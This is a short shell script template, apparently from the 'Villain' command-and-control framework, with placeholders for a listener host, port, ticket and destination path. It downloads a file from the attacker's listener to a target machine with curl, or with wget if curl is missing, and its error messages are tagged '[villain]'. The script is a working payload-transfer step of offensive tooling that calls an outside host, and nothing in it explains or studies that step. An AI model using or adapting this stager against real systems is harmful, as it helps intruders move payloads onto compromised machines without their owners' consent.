url='http://*LHOST*:*LPORT*/*TICKET*'
dest='*DEST*'
if command -v curl >/dev/null 2>&1; then
    curl -s -o "$dest" "$url" || echo "[villain] curl download failed" >&2
elif command -v wget >/dev/null 2>&1; then
    wget -q -O "$dest" "$url" || echo "[villain] wget download failed" >&2
else
    echo "[villain] no curl/wget available" >&2
fi
